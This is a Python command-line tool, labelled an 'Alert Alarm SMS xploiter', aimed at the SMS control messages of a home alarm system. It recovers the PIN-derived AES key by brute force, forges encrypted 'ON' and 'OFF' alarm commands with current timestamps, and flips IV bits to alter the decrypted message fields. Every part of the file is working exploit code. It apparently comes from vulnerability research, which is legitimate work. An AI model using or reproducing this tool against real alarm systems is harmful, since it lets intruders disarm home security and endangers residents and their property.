#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import binascii
import datetime
import logging
import secrets
import sys

from argparse import ArgumentParser
from curses.ascii import isalpha
from Crypto.Cipher import AES

###############################################################################
# Argument parser
###############################################################################

args = None


def get_parser():
    """ Takes care of script argument parsing. """
    parser = ArgumentParser(description='Alert Alarm SMS xploiter')

    parser.add_argument('-b', '--bruteforce', required=False,
                        action="store_true",
                        default=False,
                        help='Brute force, tries to find correct encryption '
                              'key and pin code')

    parser.add_argument('-d', '--decrypt', required=False, action="store_true",
                        default=False,
                        help='Perform decryption')

    parser.add_argument('-e', '--encrypt', required=False, action="store_true",
                        default=False,
                        help='Perform encryption')

    parser.add_argument('--flip', required=False, action="store",
                        default=False,
                        help='Flip <bit> to change the decrypted plaintext '
                             '(112 = i, 104 = j)')

    parser.add_argument('-i', '--input', required=False, action="store",
                        default=False,
                        help='Raw message (encrypted or decrypted)')

    parser.add_argument('-o', '--output', required=False, action="store_true",
                        default=False,
                        help='File to store output')

    parser.add_argument('--on', required=False, action="store_true",
                        default=False,
                        help='Generate alarm \'ON\' (used with parameter -e)')

    parser.add_argument('--off', required=False, action="store_true",
                        default=False,
                        help='Generate alarm \'OFF\' (used with parameter -e)')

    parser.add_argument('-t', '--test', required=False, action="store",
                        default=False,
                        help='Run using local test data')

    parser.add_argument('-p', '--pin', required=False, action="store",
                        default=False,
                        help='Pin code (to turn on/off the alarm)')

    parser.add_argument('-v', '--verbose', required=False, action="store_true",
                        default=False,
                        help='Output some verbose debugging info')

    parser.add_argument('--key', required=False, action="store",
                        default=False,
                        help='Key to use when encrypt/decrypt (in hex)')

    parser.add_argument('--iv', required=False, action="store",
                        default=False,
                        help='IV to be used (in hex)')

    parser.add_argument('--msg', required=False, action="store",
                        default=False,
                        help='Message to encrypt/decrypt (in hex)')

    parser.add_argument('--year', required=False, action="store",
                        default=False,
                        help='The year represented by two digits')

    parser.add_argument('--month', required=False, action="store",
                        default=False,
                        help='The month (1=Jan, ..., 12=Dec)')

    parser.add_argument('--day', required=False, action="store",
                        default=False,
                        help='The day represented by two digits')

    parser.add_argument('--hour', required=False, action="store",
                        default=False,
                        help='The hour represented by two digits')

    parser.add_argument('--minute', required=False, action="store",
                        default=False,
                        help='The minute represented by two digits')

    parser.add_argument('--userid', required=False, action="store",
                        default=False,
                        help='The Alert Alarm user id')

    return parser


def string_to_hex(s):
    pin = bytearray(s, 'utf-8')
    return binascii.hexlify(pin).decode()


def hex_to_bytearray(h):
    return binascii.unhexlify(h)


def bytearray_to_hex(b):
    return binascii.hexlify(b)


def print_sms_dict(sd):
    for k in sd:
        logging.debug("{}: {}".format(k, sd[k]))


def pretty_print_sms_dict(sd):
    logging.info("| sms_v | i | j | year | month | day | hour | minute | user_id |")
    logging.info("      {}   {}   {}     {}     {}    {}     {}       {}        {}".
                 format(sd["version"],
                        sd["i"],
                        sd["j"],
                        sd["year"],
                        sd["month"],
                        sd["day"],
                        sd["hour"],
                        sd["minute"],
                        sd["userid"]))


def decoded_sms_to_dict(sms):
    if len(sms) != 16:
        logging.error("Wrong decoded length!")
        sys.exit(1)

    sms_dict = {}
    try:
        sms_dict["version"] = "{}".format(int(sms[0:1]))
        sms_dict["i"] = "{}".format(int(sms[1:2]))
        sms_dict["j"] = "{}".format(int(sms[2:3]))
        sms_dict["year"] = "{:02d}".format(int(sms[3:5]))
        sms_dict["month"] = "{}".format(hex(int(sms[5:6])))
        sms_dict["day"] = "{:02d}".format(int(sms[6:8]))
        sms_dict["hour"] = "{:02d}".format(int(sms[8:10]))
        sms_dict["minute"] = "{:02d}".format(int(sms[10:12]))
        sms_dict["userid"] = "{:02d}".format(int(sms[12:14]))
    except ValueError:
        logging.error("Found bogus data (sms: {}".format(sms))
        return None

    return sms_dict


def create_msg():
    """ This function have three uses:
        1) if the '--test' parameter was given, then it will use a set of
           default data.

        2) If no '--test' given and no other data arguments, it will construct
           a message from today date with the current time. Here userid will
           always be set to 1. This is closes to what the Alert Alarm app will
           do when generating the SMS.

        3) If data arguments are given, then these will be used. For example by
           calling the script with '--hour 14', that time will be used when
           creating the message. """

    global args
    version = 2

    if args.test:
        i = 0
        j = 1
        year = "19"
        month = "5"
        day = 21
        hour = 9
        minute = 2
        userid = 1
    else:
        now = datetime.datetime.now()
        i = 0
        j = 1
        if args.year:
            if len(args.year) != 2:
                logging.error("Year must be the last two digits (i.e., 19 in "
                              "2019)")
                sys.exit(1)
            year = args.year
        else:
            year = now.strftime("%y")

        if args.month:
            if int(args.month) < 1 or int(args.month) > 12:
                logging.error("Month  must be between 1 and 12")
                sys.exit(1)
            month = hex(int(args.month) - 1)[2:3]
        else:
            month = hex(now.month - 1)[2:3]

        if args.day:
            if len(args.day) != 2 or int(args.day) < 1 or int(args.day) > 31:
                logging.error("Day must be given using two digits (i.e. 08, "
                              "22 etc)")
                sys.exit(1)
            day = int(args.day)
        else:
            day = now.day

        if args.hour:
            if len(args.hour) != 2 or int(args.hour) > 23:
                logging.error("Hour must be given using two digits (i.e. 08, "
                              "22 etc)")
                sys.exit(1)
            hour = int(args.hour)
        else:
            hour = now.hour

        if args.minute:
            if len(args.minute) != 2 or int(args.minute) > 59:
                logging.error("Minute must be given using two digits (i.e. "
                              "08, 22 etc)")
                sys.exit(1)
            minute = int(args.minute)
        else:
            minute = now.minute

        if args.userid:
            if len(args.userid) != 1:
                logging.error("UserID must be given using a single digit")
                sys.exit(1)
            userid = int(args.userid)
        else:
            userid = 1

    pad = "\x00\x00"
    msg = "{:1d}{:1d}{:1d}{:2s}{:1s}{:02d}{:02d}{:02d}{:02d}{}".format(
            version, i, j, year, month, day, hour, minute, userid, pad)
    logging.debug("Created msg({}): {}".format(len(msg), msg))

    return string_to_hex(msg)


def encrypt(key, msg, iv):
    logging.debug("(E)IV:  {}".format(iv))
    logging.debug("(E)Msg: {}".format(msg))
    logging.debug("(E)Key: {}".format(key))

    if key is None or msg is None or iv is None:
        logging.error("Missing parameters when calling encrypt")
        sys.exit(1)

    iv = hex_to_bytearray(iv)
    key = hex_to_bytearray(key)
    msg = hex_to_bytearray(msg)

    if len(key) != 16 or len(msg) != 16 or len(iv) != 16:
        logging.error("Unexpected size of parameters when calling encrypt")
        sys.exit(1)

    cipher_ctx = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher_ctx.encrypt(msg)
    logging.debug("ct:     {}".format(bytearray_to_hex(ciphertext).decode()))
    return ciphertext


def decrypt(key, msg, iv):
    logging.debug("(D)IV:  {}".format(iv))
    logging.debug("(D)Msg: {}".format(msg))
    logging.debug("(D)Key: {}".format(key))

    if key is None or msg is None or iv is None:
        logging.error("Missing parameters when calling decrypt")
        sys.exit(1)

    key = hex_to_bytearray(key)
    msg = hex_to_bytearray(msg)
    iv = hex_to_bytearray(iv)

    if len(key) != 16 or len(msg) != 16 or len(iv) != 16:
        logging.error("Unexpected size of parameters when calling decrypt")
        sys.exit(1)

    cipher_ctx = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher_ctx.decrypt(msg)
    logging.debug("pt:     {}".format(bytearray_to_hex(plaintext).decode()))
    return plaintext


def brute_force(msg, iv):
    scores = {}
    for k in range(0, 10000):
        key = string_to_hex("{}{:04d}".format("0"*12, k))
        plaintext = decrypt(key, msg, iv)
        tmp_score = 0
        for i in range(0, len(plaintext)):
            if chr(plaintext[i]).isdigit():
                tmp_score += 10
            elif isalpha(plaintext[i]):
                tmp_score += 2
        scores[key] = tmp_score

    best_score = 0
    best_key = ""

    for k in scores:
        if scores[k] > best_score:
            best_score = scores[k]
            best_key = k

    logging.debug("Best key score: {}".format(best_score))
    pin = binascii.unhexlify(best_key[24:32])
    logging.info("(Probably) found the correct ...")
    logging.info("   encryption key: {}".format(best_key))
    logging.info("   pin:            {}".format(int((pin))))


def setup_iv():
    iv = None
    if args.iv:
        if len(args.iv) != 32:
            logging.error("Wrong size of IV")
            sys.exit(1)
        iv = args.iv

    if args.encrypt:
        if iv is None:
            # Generate a random IV, crude way to know that there is always 32
            # bytes
            while True:
                iv = format(secrets.randbelow(2**128), 'x')
                if len(iv) == 32:
                    break
    elif (args.decrypt or args.flip or args.bruteforce) and args.input:
        iv = args.input[0:32]

    return iv


def setup_msg():
    msg = None
    if args.msg:
        if len(args.msg) != 32:
            logging.error("Wrong size of message")
            sys.exit(1)
        msg = args.msg

    if args.encrypt and msg is None:
        msg = create_msg()
    elif (args.decrypt or args.flip or args.bruteforce) and msg is None:
        msg = args.input[32:64]

    return msg


def setup_key():
    key = None
    key_raw = "{}".format("0"*16)
    pin = None

    if args.pin:
        pin = args.pin
        key_raw = "{}{}".format("0"*12, pin)
        key = string_to_hex(key_raw)
    elif args.key:
        if len(args.key) != 32:
            logging.error("Wrong size of key")
            sys.exit(1)
        key_raw = hex_to_bytearray((args.key)).decode()
        key = args.key

    return key, key_raw


def configure_logging():
    if args.verbose:
        logging.basicConfig(format='[%(levelname)s]: %(message)s',
                            level=logging.DEBUG)
    else:
        logging.basicConfig(format='[%(levelname)s]: %(message)s',
                            level=logging.INFO)


def check_args_combinations():
    if args.input and len(args.input) != 64:
        logging.error("Not the expected length of an Alert Alarm SMS "
                      "(64 bytes)")
        sys.exit(1)

    if args.encrypt and args.decrypt:
        logging.error("Cannot use -e (--encrypt) and -d (--decrypt) at the "
                      "same time")
        sys.exit(1)

    if args.decrypt:
        if not args.pin and not args.key:
            logging.error("Pin (-p) or key (--key) must be supplied when "
                          "running decrypt (-d)")
            sys.exit(1)


###############################################################################
# Main function
###############################################################################


def main(argv):
    global args
    parser = get_parser()

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    configure_logging()
    check_args_combinations()

    iv = setup_iv()
    msg = setup_msg()
    key, key_raw = setup_key()

    if args.input:
        logging.info("Original SMS:     {}".format(args.input))
    logging.info("Msg:              {}".format(msg))
    logging.info("IV:               {}".format(iv))
    logging.info("Key:              {} ({})\n".format(key, key_raw))

    if args.encrypt:
        logging.info("Mode: encryption")
        ciphertext = encrypt(key, msg, iv)
        logging.info("Crafted SMS:      {}{}".
                     format(iv, bytearray_to_hex(ciphertext).decode()))

    if args.decrypt:
        if args.flip:
            logging.info("Mode: flip bits")
            iv = int(iv, 16)
            iv = iv ^ (1 << int(args.flip))
            iv = format(iv, 'x')
            logging.info("Modified IV:      {}".format(iv))
            logging.info("Modified SMS:     {}{}".format(iv, msg))
            logging.info("Continue with decryption to show results after "
                         "flipping a bit")

        logging.info("Mode: decryption")
        plaintext = decrypt(key, msg, iv)
        pt_dict = decoded_sms_to_dict(plaintext)
        if pt_dict is not None:
            pretty_print_sms_dict(pt_dict)

    if args.bruteforce:
        logging.info("Mode: bruteforce")
        brute_force(msg, iv)


if __name__ == "__main__":
    main(sys.argv)
